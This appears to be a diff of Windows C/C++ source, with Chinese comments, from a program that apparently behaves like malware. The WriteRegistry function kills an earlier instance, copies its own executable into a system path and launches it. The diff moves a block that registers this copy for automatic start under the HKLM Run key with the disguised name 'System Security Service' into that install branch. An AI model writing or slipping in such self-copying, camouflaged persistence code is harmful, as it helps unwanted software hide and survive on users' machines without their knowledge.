@@ -31,6 +31,14 @@ string WriteRegistry()
 		sprintf_s(tmpCh, "taskkill /f /im %s", NEW_FILE);
 		system(tmpCh); // 结束之前运行的程序
 		CopyFile(filePath, sysPath, false);//自我复制到目标路径并覆盖存在文件
+
+		HKEY hKey; // 写入到注册表，以便开机自动运行
+		// 打开注册表：路径如下HEKY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
+		RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
+		// 新增一个值，名称随意命名，值为要开机运行的文件的完整路径
+		RegSetValueEx(hKey, "系统安全服务", 0, REG_SZ, (const unsigned char*)sysPath, sizeof(sysPath));
+		RegCloseKey(hKey); // 关闭注册表
+
 		ShellExecute(NULL,"open", sysPath, NULL, NULL, SW_SHOWNORMAL);
 		//system(sysPath);
 		//WinExec(sysPath, SW_SHOWNORMAL);
@@ -38,14 +46,8 @@ string WriteRegistry()
 	}
 	else
 	{
-		HKEY hKey; // 写入到注册表，以便开机自动运行
-		// 打开注册表：路径如下HEKY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
-		RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
-		// 新增一个值，名称随意命名，值为要开机运行的文件的完整路径
-		RegSetValueEx(hKey, "系统安全服务", 0, REG_SZ, (const unsigned char*)sysPath, sizeof(sysPath));
-		RegCloseKey(hKey); // 关闭注册表
 		_tcsrchr(sysPath, _T('\\'))[0] = 0;
-		return sysPath;
+		return sysPath; // 返回运行的路径
 	}
 }
 
